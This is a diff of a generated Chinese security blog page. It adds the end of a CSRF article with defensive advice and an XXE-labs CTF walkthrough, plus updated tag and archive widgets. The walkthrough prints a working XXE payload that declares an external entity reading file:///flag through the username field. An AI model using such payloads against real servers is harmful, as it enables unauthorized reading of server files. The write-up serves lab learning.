+<li><strong>CSRF Token:</strong><br>在敏感表单中加入一个随机生成的 token，并在服务器端进行校验，确保请求来源正确。</li>
+<li><strong>SameSite Cookie 属性：</strong><br>设置 Cookie 的 SameSite 属性（如 SameSite&#x3D;Lax 或 SameSite&#x3D;Strict），可以有效减少跨站请求中 Cookie 被自动发送的风险。</li>
+<li><strong>双重验证:</strong><br>对于关键操作，要求用户在执行操作时进行额外确认（如验证码、短信验证等）。</li>
+<li><strong>CSP（Content Security Policy）：</strong><br>限制外部脚本的加载，有助于降低 XSS 攻击风险，但对于 CSRF 攻击防护效果有限。</li>
+</ul>
+<p>‍</p>
+<h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>CSRF 攻击利用浏览器自动携带 Cookie 的特点，让受害者在不知情的情况下执行敏感操作。在 CTF 竞赛中，题目往往会设计场景，让参赛者通过 CSRF 触发反射型 XSS，从而获取管理员页面中的 flag。<br>本文详细介绍了 CSRF 攻击的原理、常见方式以及一个实战案例，并讨论了如何防御此类攻击。</p>
+<p>理解并掌握 CSRF 攻击有助于你在 CTF 中快速识别并利用漏洞，同时也能提高你对 Web 安全防护措施的理解。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/" data-id="cmawczpnx001nik7kgpebbe8e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/XXE（XML外部实体注入）/XXE-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XXE-labs"><a href="#XXE-labs" class="headerlink" title="XXE-labs"></a>XXE-labs</h1><blockquote>
+<p>我发现输入得用户名以 &#x3D;&#x3D;弹窗（alert）&#x3D;&#x3D; 的形式输出</p>
+</blockquote>
+<p><img src="/.com//image-20250422222903-k9ji6kx.png" alt="image">​</p>
+<blockquote>
+<p>同时 F12 进行前端查看 发现 在提交按钮处有</p>
+<p>​<code>&lt;button id=&quot;go&quot; onclick=&quot;XMLFunction()&quot;&gt;GO!&lt;/button&gt;</code>​</p>
+</blockquote>
+<p>&#x3D;&#x3D;说明我们的 数据传输方式为 xml&#x3D;&#x3D;<br> 当然，我们也可以直接 在burp suite 进行抓包查看</p>
+<p><img src="/.com//image-20250422223115-kr6nf3v.png" alt="image">​</p>
+<blockquote>
+<p>我们看到了 xml 文档声明：</p>
+<p>​<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>​</p>
+</blockquote>
+<p>所以，可能存在 xxe 漏洞</p>
+<p> 我们构造payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2333<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过引用定义在外部的 DTD 中的实体，我们称之为外部实体) 来访问我们 的 flag<br>有人可能会问 flag 也不会是 dtd 文件啊<br>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件<br>造成漏洞，这就是xxe</p>
+</blockquote>
+<p>所以到了这个时候，我们也就能够明白我们上面构造的payload的含义了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span>    <span class="comment">&lt;!--使用admin实体--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>                        <span class="comment">&lt;!--声明admin实体--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入</p>
+<p> 点击 go 发现 flag</p>
+<p><img src="/.com//40ff3cea6e98dbb09db72be6393d5d29-20250422223739-segc056.png" alt="40ff3cea6e98dbb09db72be6393d5d29"></p>
+<p>当然在这里我们也可以 使用 postman （本质是一样的，都是传递参数 将我们的payload传递到后台 php）</p>
+<p> 我们查看源代码，发现是 post 传参</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">XMLFunction</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;root&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;username&gt;&#x27;</span> + $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/username&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;password&gt;&#x27;</span> + $(<span class="string">&#x27;#password&#x27;</span>).<span class="title function_">val</span>() + <span class="string">&#x27;&lt;/password&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27; &lt;/root&gt;&#x27;</span>; &lt;!--转化数据格式   串行格式化数据--&gt;</span><br><span class="line">            <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();   &lt;!--实例化<span class="title class_">XMLHttpRequest</span> 对象--&gt;</span><br><span class="line">            xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; &lt;!--页面初始化--&gt;</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span> == <span class="number">4</span>)&#123; &lt;!--实时跟踪异步响应状态，监听函数 readyState4 数据接收完毕  此时可以获取完整的响应数据--&gt;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">readyState</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);  &lt;!--接受数据--&gt;</span><br><span class="line">                    <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);&lt;!--弹窗 接受数据--&gt;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">            xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;login.php&quot;</span>,<span class="literal">true</span>); &lt;!---建立 post请求，要求异步响应   xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">false</span>)--&gt;</span><br><span class="line">            xmlhttp.<span class="title function_">send</span>(xml);  &lt;!--发送请求--&gt;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面有两点值得我们注意：</p>
+<ol>
+<li>是 post 传参</li>
+<li>接受地址是 login.php</li>
+</ol>
+<p> 现在我们使用 postman 了</p>
+<p><img src="/.com//454b83cf5da1b573bd3c3081543785ab-20250422223813-1wlcleh.png" alt="454b83cf5da1b573bd3c3081543785ab">​</p>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/XXE-labs/" data-id="cmawczpnz001uik7kc3yw1y8z" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -3089,7 +2834,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
     </div>
   </div>
 
@@ -3099,7 +2844,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
     </div>
   </div>
 
@@ -3108,7 +2853,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
     </div>
   </div>
 
@@ -3121,11 +2866,11 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
